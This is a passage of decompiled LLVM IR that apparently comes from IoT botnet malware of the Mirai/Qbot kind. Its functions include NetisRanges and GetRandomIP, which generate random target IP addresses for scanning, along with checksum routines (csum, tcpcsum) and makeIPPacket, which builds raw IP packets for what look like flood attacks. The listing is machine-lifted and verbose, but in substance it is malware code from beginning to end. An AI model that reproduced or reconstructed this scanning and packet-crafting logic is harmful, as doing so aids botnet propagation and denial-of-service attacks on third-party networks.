  %v8_c2e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1ad20.293 to i32), i32 %v4_c2e8, i32 %v6_c2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2ec

dec_label_pc_c2ec:                                ; preds = %dec_label_pc_c2b8, %dec_label_pc_c2c4
  %v7_c2f0 = icmp eq i32 %v2_ab54, 107
  br i1 %v7_c2f0, label %dec_label_pc_c2f8, label %dec_label_pc_c320

dec_label_pc_c2f8:                                ; preds = %dec_label_pc_c2ec
  %v3_c304 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c310 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c31c = sext i8 %v3_c304 to i32
  %v6_c31c = sext i8 %v3_c310 to i32
  %v8_c31c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1ad2c.295 to i32), i32 %v4_c31c, i32 %v6_c31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %dec_label_pc_c2ec, %dec_label_pc_c2f8
  %v7_c324 = icmp eq i32 %v2_ab54, 108
  br i1 %v7_c324, label %dec_label_pc_c32c, label %dec_label_pc_c354

dec_label_pc_c32c:                                ; preds = %dec_label_pc_c320
  %v3_c338 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c344 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c350 = sext i8 %v3_c338 to i32
  %v6_c350 = sext i8 %v3_c344 to i32
  %v8_c350 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ad3c.297 to i32), i32 %v4_c350, i32 %v6_c350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c354

dec_label_pc_c354:                                ; preds = %dec_label_pc_c320, %dec_label_pc_c32c
  %v7_c358 = icmp eq i32 %v2_ab54, 109
  br i1 %v7_c358, label %dec_label_pc_c360, label %dec_label_pc_c388

dec_label_pc_c360:                                ; preds = %dec_label_pc_c354
  %v3_c36c = load i8, i8* @global_var_2c921.82, align 1
  %v3_c378 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c384 = sext i8 %v3_c36c to i32
  %v6_c384 = sext i8 %v3_c378 to i32
  %v8_c384 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ad4c.299 to i32), i32 %v4_c384, i32 %v6_c384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c388

dec_label_pc_c388:                                ; preds = %dec_label_pc_c354, %dec_label_pc_c360
  %v7_c38c = icmp eq i32 %v2_ab54, 110
  br i1 %v7_c38c, label %dec_label_pc_c394, label %dec_label_pc_c3bc

dec_label_pc_c394:                                ; preds = %dec_label_pc_c388
  %v3_c3a0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c3ac = load i8, i8* @global_var_2c922.83, align 1
  %v4_c3b8 = sext i8 %v3_c3a0 to i32
  %v6_c3b8 = sext i8 %v3_c3ac to i32
  %v8_c3b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1ad5c.301 to i32), i32 %v4_c3b8, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3bc

dec_label_pc_c3bc:                                ; preds = %dec_label_pc_c388, %dec_label_pc_c394
  %v7_c3c0 = icmp eq i32 %v2_ab54, 111
  br i1 %v7_c3c0, label %dec_label_pc_c3c8, label %dec_label_pc_c3f0

dec_label_pc_c3c8:                                ; preds = %dec_label_pc_c3bc
  %v3_c3d4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c3e0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c3ec = sext i8 %v3_c3d4 to i32
  %v6_c3ec = sext i8 %v3_c3e0 to i32
  %v8_c3ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ad6c.303 to i32), i32 %v4_c3ec, i32 %v6_c3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3f0

dec_label_pc_c3f0:                                ; preds = %dec_label_pc_c3bc, %dec_label_pc_c3c8
  %v7_c3f4 = icmp eq i32 %v2_ab54, 112
  br i1 %v7_c3f4, label %dec_label_pc_c3fc, label %dec_label_pc_c424

dec_label_pc_c3fc:                                ; preds = %dec_label_pc_c3f0
  %v3_c408 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c414 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c420 = sext i8 %v3_c408 to i32
  %v6_c420 = sext i8 %v3_c414 to i32
  %v8_c420 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ad7c.305 to i32), i32 %v4_c420, i32 %v6_c420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c424

dec_label_pc_c424:                                ; preds = %dec_label_pc_c3f0, %dec_label_pc_c3fc
  %v7_c428 = icmp eq i32 %v2_ab54, 113
  br i1 %v7_c428, label %dec_label_pc_c430, label %dec_label_pc_c458

dec_label_pc_c430:                                ; preds = %dec_label_pc_c424
  %v3_c43c = load i8, i8* @global_var_2c921.82, align 1
  %v3_c448 = load i8, i8* @global_var_2c922.83, align 1
  %v4_c454 = sext i8 %v3_c43c to i32
  %v6_c454 = sext i8 %v3_c448 to i32
  %v8_c454 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1ad8c.307 to i32), i32 %v4_c454, i32 %v6_c454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c458

dec_label_pc_c458:                                ; preds = %dec_label_pc_c424, %dec_label_pc_c430
  %v7_c45c = icmp eq i32 %v2_ab54, 114
  br i1 %v7_c45c, label %dec_label_pc_c464, label %dec_label_pc_c48c

dec_label_pc_c464:                                ; preds = %dec_label_pc_c458
  %v3_c470 = load i8, i8* @global_var_2c921.82, align 1
  %v3_c47c = load i8, i8* @global_var_2c922.83, align 1
  %v4_c488 = sext i8 %v3_c470 to i32
  %v6_c488 = sext i8 %v3_c47c to i32
  %v8_c488 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ad9c.309 to i32), i32 %v4_c488, i32 %v6_c488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c48c

dec_label_pc_c48c:                                ; preds = %dec_label_pc_c458, %dec_label_pc_c464
  store i32 %v2_aa80, i32* @r0, align 4
  %v1_c4c8 = call i32 @inet_addr(i32 %v2_aa80)
  store i32 %v3_aa78, i32* @fp, align 4
  ret i32 %v1_c4c8

; uselistorder directives
  uselistorder i32 %v2_aa80, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1a91c.159 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1a728.87 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1a718.85 to i32), { 1, 0 }
  uselistorder i8* @global_var_2c922.83, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c48c, { 1, 0 }
  uselistorder label %dec_label_pc_c458, { 1, 0 }
  uselistorder label %dec_label_pc_c424, { 1, 0 }
  uselistorder label %dec_label_pc_c3f0, { 1, 0 }
  uselistorder label %dec_label_pc_c3bc, { 1, 0 }
  uselistorder label %dec_label_pc_c388, { 1, 0 }
  uselistorder label %dec_label_pc_c354, { 1, 0 }
  uselistorder label %dec_label_pc_c320, { 1, 0 }
  uselistorder label %dec_label_pc_c2ec, { 1, 0 }
  uselistorder label %dec_label_pc_c2b8, { 1, 0 }
  uselistorder label %dec_label_pc_c284, { 1, 0 }
  uselistorder label %dec_label_pc_c250, { 1, 0 }
  uselistorder label %dec_label_pc_c21c, { 1, 0 }
  uselistorder label %dec_label_pc_c1e8, { 1, 0 }
  uselistorder label %dec_label_pc_c1b4, { 1, 0 }
  uselistorder label %dec_label_pc_c180, { 1, 0 }
  uselistorder label %dec_label_pc_c14c, { 1, 0 }
  uselistorder label %dec_label_pc_c118, { 1, 0 }
  uselistorder label %dec_label_pc_c0e4, { 1, 0 }
  uselistorder label %dec_label_pc_c0b0, { 1, 0 }
  uselistorder label %dec_label_pc_c07c, { 1, 0 }
  uselistorder label %dec_label_pc_c048, { 1, 0 }
  uselistorder label %dec_label_pc_c014, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 1, 0 }
  uselistorder label %dec_label_pc_bfac, { 1, 0 }
  uselistorder label %dec_label_pc_bf78, { 1, 0 }
  uselistorder label %dec_label_pc_bf44, { 1, 0 }
  uselistorder label %dec_label_pc_bf10, { 1, 0 }
  uselistorder label %dec_label_pc_bedc, { 1, 0 }
  uselistorder label %dec_label_pc_bea8, { 1, 0 }
  uselistorder label %dec_label_pc_be74, { 1, 0 }
  uselistorder label %dec_label_pc_be40, { 1, 0 }
  uselistorder label %dec_label_pc_be0c, { 1, 0 }
  uselistorder label %dec_label_pc_bdd8, { 1, 0 }
  uselistorder label %dec_label_pc_bda4, { 1, 0 }
  uselistorder label %dec_label_pc_bd70, { 1, 0 }
  uselistorder label %dec_label_pc_bd3c, { 1, 0 }
  uselistorder label %dec_label_pc_bd08, { 1, 0 }
  uselistorder label %dec_label_pc_bcd4, { 1, 0 }
  uselistorder label %dec_label_pc_bca0, { 1, 0 }
  uselistorder label %dec_label_pc_bc6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc38, { 1, 0 }
  uselistorder label %dec_label_pc_ba34, { 1, 0 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
  uselistorder label %dec_label_pc_b9cc, { 1, 0 }
  uselistorder label %dec_label_pc_b998, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b8fc, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 1, 0 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b860, { 1, 0 }
  uselistorder label %dec_label_pc_b82c, { 1, 0 }
  uselistorder label %dec_label_pc_b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %dec_label_pc_b728, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
  uselistorder label %dec_label_pc_ad00, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
  uselistorder label %dec_label_pc_ac30, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_ab94, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_c4e0 = load i32, i32* @r4, align 4
  store i32 50408, i32* %stack_var_-4, align 4
  %v2_c4e4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c4e4, i32* @fp, align 4
  %v0_c4ec = call i32 @random()
  %v1_c4f4 = urem i32 %v0_c4ec, 16
  %v4_c504 = mul nuw nsw i32 %v1_c4f4, 4
  %v5_c504 = add i32 %v4_c504, ptrtoint (i32* @global_var_2c540.311 to i32)
  %v6_c504 = inttoptr i32 %v5_c504 to i32*
  %v7_c504 = load i32, i32* %v6_c504, align 4
  %v1_c510 = trunc i32 %v7_c504 to i8
  store i8 %v1_c510, i8* bitcast (i8** @global_var_2c91e.79 to i8*), align 4
  %v0_c514 = call i32 @random()
  %v2_c524 = srem i32 %v0_c514, 255
  %v1_c534 = trunc i32 %v2_c524 to i8
  store i8 %v1_c534, i8* @global_var_2c91f.80, align 1
  %v0_c538 = call i32 @random()
  %v2_c548 = srem i32 %v0_c538, 255
  %v1_c558 = trunc i32 %v2_c548 to i8
  store i8 %v1_c558, i8* @global_var_2c920.81, align 1
  %v0_c55c = call i32 @random()
  %v2_c56c = srem i32 %v0_c55c, 255
  %v1_c57c = trunc i32 %v2_c56c to i8
  store i8 %v1_c57c, i8* @global_var_2c921.82, align 1
  %v2_c580 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v2_c5bc = load i8, i8* bitcast (i8** @global_var_2c91e.79 to i8*), align 4
  %v3_c5bc = zext i8 %v2_c5bc to i32
  %v3_c5c8 = load i8, i8* @global_var_2c91f.80, align 1
  %v4_c5c8 = zext i8 %v3_c5c8 to i32
  store i32 %v4_c5c8, i32* @r4, align 4
  %v3_c5d4 = load i8, i8* @global_var_2c920.81, align 1
  %v6_c5fc = sext i8 %v3_c5c8 to i32
  %v8_c5fc = sext i8 %v3_c5d4 to i32
  %v9_c5fc = call i32 @szprintf(i32 %v2_c580, i32 ptrtoint ([12 x i8]* @global_var_1adac.314 to i32), i32 %v3_c5bc, i32 %v6_c5fc, i32 %v8_c5fc)
  store i32 %v2_c580, i32* @r0, align 4
  %v1_c608 = call i32 @inet_addr(i32 %v2_c580)
  store i32 %v3_c4e0, i32* @r4, align 4
  ret i32 %v1_c608

; uselistorder directives
  uselistorder i32 %v2_c580, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2c921.82, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c920.81, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c91f.80, { 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2c91e.79 to i8*), { 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_c62c = load i32, i32* @fp, align 4
  %v2_c640 = load i32, i32* @global_var_32b84.316, align 4
  %v1_c648 = call i32 @ntohl(i32 %v2_c640)
  %v2_c654 = and i32 %v1_c648, %arg1
  %v0_c65c = call i32 @rand_cmwc()
  %v1_c668 = sub i32 -1, %arg1
  %v2_c66c = and i32 %v0_c65c, %v1_c668
  %v2_c674 = xor i32 %v2_c66c, %v2_c654
  store i32 %v3_c62c, i32* @fp, align 4
  ret i32 %v2_c674

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_c7049 = icmp sgt i32 %arg2, 1
  br i1 %v8_c7049, label %dec_label_pc_c6b4, label %dec_label_pc_c708

dec_label_pc_c6b4:                                ; preds = %entry, %dec_label_pc_c6b4
  %v2_c6d0 = phi i32 [ %v2_c6d4, %dec_label_pc_c6b4 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_c6d8, %dec_label_pc_c6b4 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_c6f4, %dec_label_pc_c6b4 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_c6ec, %dec_label_pc_c6b4 ], [ %arg1, %entry ]
  %v4_c6b4 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_c6b8 = load i8, i8* %stack_var_-32.010, align 1
  %v3_c6b8 = zext i8 %v2_c6b8 to i32
  %v1_c6bc = add i32 %v4_c6b4, 1
  %v2_c6bc = inttoptr i32 %v1_c6bc to i8*
  %v3_c6bc = load i8, i8* %v2_c6bc, align 1
  %v4_c6bc = zext i8 %v3_c6bc to i32
  %v4_c6c0 = mul nuw nsw i32 %v4_c6bc, 256
  %v5_c6c0 = or i32 %v4_c6c0, %v3_c6b8
  %v2_c6d4 = add i32 %v5_c6c0, %v2_c6d0
  %v3_c6d4 = icmp ult i32 %v2_c6d4, %v2_c6d0
  %v4_c6d8 = zext i1 %v3_c6d4 to i32
  %v5_c6d8 = add i32 %v4_c6d8, %stack_var_-40.012
  %v1_c6e8 = add i32 %v4_c6b4, 2
  %v5_c6ec = inttoptr i32 %v1_c6e8 to i8*
  %v1_c6f4 = add nsw i32 %stack_var_-36.011, -2
  %v8_c704 = icmp sgt i32 %v1_c6f4, 1
  br i1 %v8_c704, label %dec_label_pc_c6b4, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c6b4, %entry
  %v2_c728 = phi i32 [ 0, %entry ], [ %v2_c6d4, %dec_label_pc_c6b4 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_c6ec, %dec_label_pc_c6b4 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_c6d8, %dec_label_pc_c6b4 ]
  %v7_c700.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_c6f4, %dec_label_pc_c6b4 ]
  %v7_c700.lcssa = icmp eq i32 %v7_c700.lcssa.in, 1
  br i1 %v7_c700.lcssa, label %dec_label_pc_c714, label %dec_label_pc_c790.preheader

dec_label_pc_c714:                                ; preds = %dec_label_pc_c708
  %v2_c718 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_c718 = zext i8 %v2_c718 to i32
  %v2_c72c = add i32 %v3_c718, %v2_c728
  %v3_c72c = icmp ult i32 %v2_c72c, %v2_c728
  %v4_c730 = zext i1 %v3_c72c to i32
  %v5_c730 = add i32 %v4_c730, %stack_var_-40.0.lcssa
  br label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %dec_label_pc_c714, %dec_label_pc_c708
  %v3_c7bc.ph = phi i32 [ %v2_c728, %dec_label_pc_c708 ], [ %v2_c72c, %dec_label_pc_c714 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_c708 ], [ %v5_c730, %dec_label_pc_c714 ]
  %v3_c79436 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_c79c37 = udiv i32 %v3_c7bc.ph, 65536
  %v2_c7a038 = or i32 %v3_c79436, %v3_c79c37
  %v3_c7a839 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_c7b040 = or i32 %v2_c7a038, %v3_c7a839
  %v2_c7b441 = icmp eq i32 %v2_c7b040, 0
  br i1 %v2_c7b441, label %dec_label_pc_c7bc, label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c790.preheader, %dec_label_pc_c740
  %v3_c7a844 = phi i32 [ %v3_c7a8, %dec_label_pc_c740 ], [ %v3_c7a839, %dec_label_pc_c790.preheader ]
  %v2_c7a043 = phi i32 [ %v2_c7a0, %dec_label_pc_c740 ], [ %v2_c7a038, %dec_label_pc_c790.preheader ]
  %v3_c7bc42 = phi i32 [ %v2_c780, %dec_label_pc_c740 ], [ %v3_c7bc.ph, %dec_label_pc_c790.preheader ]
  %v2_c754 = urem i32 %v3_c7bc42, 65536
  %v2_c780 = add i32 %v2_c7a043, %v2_c754
  %v3_c780 = icmp ult i32 %v2_c780, %v2_c754
  %v4_c784 = zext i1 %v3_c780 to i32
  %v5_c784 = add nuw nsw i32 %v4_c784, %v3_c7a844
  %v3_c794 = mul i32 %v5_c784, 65536
  %v3_c79c = udiv i32 %v2_c780, 65536
  %v2_c7a0 = or i32 %v3_c794, %v3_c79c
  %v3_c7a8 = udiv i32 %v5_c784, 65536
  %v2_c7b0 = or i32 %v2_c7a0, %v3_c7a8
  %v2_c7b4 = icmp eq i32 %v2_c7b0, 0
  br i1 %v2_c7b4, label %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge, label %dec_label_pc_c740

dec_label_pc_c790.dec_label_pc_c7bc_crit_edge:    ; preds = %dec_label_pc_c740
  br label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge, %dec_label_pc_c790.preheader
  %v3_c7bc.lcssa = phi i32 [ %v2_c780, %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge ], [ %v3_c7bc.ph, %dec_label_pc_c790.preheader ]
  %v1_c7c8 = urem i32 %v3_c7bc.lcssa, 65536
  %v3_c7d0 = xor i32 %v1_c7c8, 65535
  ret i32 %v3_c7d0

; uselistorder directives
  uselistorder i32 %v2_c7a0, { 1, 0 }
  uselistorder i32 %v5_c784, { 1, 0 }
  uselistorder i32 %v2_c780, { 2, 0, 3, 1 }
  uselistorder i32 %v3_c7a839, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_c7bc.ph, { 2, 1, 0 }
  uselistorder i32 %v2_c728, { 0, 2, 1 }
  uselistorder i32 %v1_c6f4, { 0, 2, 1 }
  uselistorder i32 %v2_c6d4, { 0, 2, 1 }
  uselistorder i32 %v2_c6d0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c740, { 1, 0 }
  uselistorder label %dec_label_pc_c6b4, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_c7e4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_c81c = add i32 %arg1, 12
  %v2_c81c = inttoptr i32 %v1_c81c to i32*
  %v3_c81c = load i32, i32* %v2_c81c, align 4
  store i32 %v3_c81c, i32* %stack_var_-44, align 4
  %v1_c844 = call i32 @htons(i32 20)
  %v1_c868 = call i32 @malloc(i32 32)
  %v2_c878 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_c868, i32* @r0, align 4
  store i32 %v2_c878, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_c88c = call i32 @memcpy()
  %v1_c894 = add i32 %v1_c868, 12
  %v3_c898 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_c894, i32* @r0, align 4
  store i32 %v3_c898, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_c8ac = call i32 @memcpy()
  %v2_c8b8 = inttoptr i32 %v1_c868 to i8*
  %v3_c8b8 = call i32 @csum(i8* %v2_c8b8, i32 32)
  %sext2 = mul i32 %v3_c8b8, 16777216
  %v3_c8c4 = ashr i32 %sext2, 31
  store i32 %v1_c868, i32* @r0, align 4
  %v0_c8d0 = call i32 @free()
  %v3_c8d8 = sdiv i32 %sext2, 16777216
  %v4_c8dc = mul nsw i32 %v3_c8c4, 256
  %v4_c8e0 = and i32 %v4_c8dc, 65280
  %v5_c8e0 = or i32 %v4_c8e0, %v3_c8d8
  store i32 %v3_c7e4, i32* @fp, align 4
  ret i32 %v5_c8e0

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_c868, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_c8f4 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_c914 = load i8, i8* %arg1, align 1
  %v4_c91c = zext i8 %v2_c914 to i32
  %v1_c920 = and i32 %v4_c91c, 240
  %v1_c924 = or i32 %v1_c920, 5
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  %v1_c930 = trunc i32 %v1_c924 to i8
  store i8 %v1_c930, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_c960 = add i32 %tmp4, 1
  %v4_c960 = inttoptr i32 %v3_c960 to i8*
  store i8 0, i8* %v4_c960, align 1
  %v3_c964 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_c964, 20
  %v3_c978 = urem i32 %fold, 65536
  store i32 %v3_c978, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_c980 = trunc i32 %fold to i8
  %v3_c980 = add i32 %tmp4, 2
  %v4_c980 = inttoptr i32 %v3_c980 to i8*
  store i8 %v1_c980, i8* %v4_c980, align 1
  %v0_c984 = load i32, i32* %r3.global-to-local, align 4
  %v3_c984 = sdiv i32 %v0_c984, 256
  store i32 %v3_c984, i32* %r3.global-to-local, align 4
  %v1_c988 = trunc i32 %v3_c984 to i8
  %v2_c988 = load i32, i32* %r2.global-to-local, align 4
  %v3_c988 = add i32 %v2_c988, 3
  %v4_c988 = inttoptr i32 %v3_c988 to i8*
  store i8 %v1_c988, i8* %v4_c988, align 1
  %v0_c98c = call i32 @rand_cmwc()
